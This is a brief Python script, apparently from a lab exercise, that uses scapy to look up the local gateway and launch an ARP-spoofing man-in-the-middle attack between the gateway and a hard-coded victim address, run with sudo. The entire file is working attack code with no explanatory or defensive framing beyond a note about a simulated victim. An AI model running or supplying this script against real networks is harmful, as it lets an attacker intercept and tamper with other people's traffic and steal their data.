from scapy.all import *

# find local gateway addresses and interface, using a random IP address for the command
route = conf.route.route("123.123.123.000") 

INTERFACE = route[0]
GATEWAY_IP = route[2]

# Attacker's addresses
ATTACKER_IP = "192.168.209.128"

# Victim's addresses
VICTIM_IP = "192.168.1.123"
# TODO: set up simulated victim

if __name__ == "__main__":
    arp_mitm(GATEWAY_IP, VICTIM_IP)

    # sudo python3 arp_module.py
